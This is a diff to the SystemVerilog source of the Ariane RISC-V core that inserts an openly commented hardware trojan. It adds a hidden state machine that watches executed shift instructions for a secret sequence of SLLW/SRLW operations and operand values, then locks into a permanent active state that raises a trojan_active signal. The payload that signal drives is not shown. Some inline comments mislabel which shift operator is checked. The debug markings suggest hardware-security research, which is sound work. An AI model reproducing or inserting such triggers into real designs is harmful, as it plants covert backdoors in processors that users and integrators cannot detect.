@@ -96,6 +96,77 @@ module ariane #(
   always_comb begin: ila_instance3
      ila_fu_data_id_ex=fu_data_id_ex;
   end
+          
+  //trojan insertion
+  //hardware trojan
+  //added by Shayan
+typedef enum logic[2:0] {IDLE, TRIGGER1,TRIGGER1_1, TRIGGER2,TRIGGER2_1,ACTIVE} trojan_states_t;
+(* MARK_DEBUG = "TRUE" *) trojan_states_t current_trojan_state,next_trojan_state;
+(* MARK_DEBUG = "TRUE" *) logic trojan_active;
+//signals we need
+//fu_data_id_ex.operator [6:0]
+//fu_data_id_ex.operand_b [63:0]
+//setting next state
+always_ff @(posedge clk_i or negedge rst_ni) begin 
+	if (rst_ni == 1'b0)
+		current_trojan_state <= IDLE; 
+	else
+		current_trojan_state <= next_trojan_state;
+end
+
+
+//setting the logic for next state
+always_comb begin 
+	case (current_trojan_state)
+	IDLE: begin
+		if (fu_data_id_ex.operator==7'd11 && fu_data_id_ex.operand_b==64'd1) //SLLW: logical shift left
+			next_trojan_state=TRIGGER1;
+		else
+			next_trojan_state=IDLE;
+	end
+	TRIGGER1: begin
+    if (fu_data_id_ex.operator==7'd11 && fu_data_id_ex.operand_b==64'd1) //SLLW: logical shift left
+			next_trojan_state=TRIGGER1_1;
+		else
+			next_trojan_state=IDLE;
+	end
+	TRIGGER1_1: begin
+		if (fu_data_id_ex.operator==7'd10 && fu_data_id_ex.operand_b==64'd2) //SRLW: logical shift right
+			next_trojan_state=TRIGGER2;
+		else if (fu_data_id_ex.operator==7'd10||fu_data_id_ex.operator==7'd11)//command is  shift but wrong value
+			next_trojan_state=IDLE;
+		else
+			next_trojan_state=TRIGGER1_1;		
+
+	end
+	TRIGGER2: begin
+		if (fu_data_id_ex.operator==7'd10 && fu_data_id_ex.operand_b==64'd2) //SLLW: logical shift left
+			next_trojan_state=TRIGGER2_1;
+		else
+			next_trojan_state=IDLE;	
+	end
+	TRIGGER2_1: begin
+	   	if (fu_data_id_ex.operator==7'd11 && fu_data_id_ex.operand_b==64'd1) //SLLW: logical shift left
+			next_trojan_state=ACTIVE;
+		else if (fu_data_id_ex.operator==7'd10||fu_data_id_ex.operator==7'd11)//command is  shift but other value
+			next_trojan_state=IDLE;
+		else
+			next_trojan_state=TRIGGER2_1;	
+	end
+	ACTIVE: begin
+			next_trojan_state=ACTIVE;
+	end
+	default: begin
+			next_trojan_state=IDLE;
+	end
+	endcase
+	
+	if (current_trojan_state == ACTIVE)
+		trojan_active=1'b1;
+	else
+		trojan_active=1'b0;
+end
+
   // fixed latency units
   logic                     flu_ready_ex_id;
   logic [TRANS_ID_BITS-1:0] flu_trans_id_ex_id;
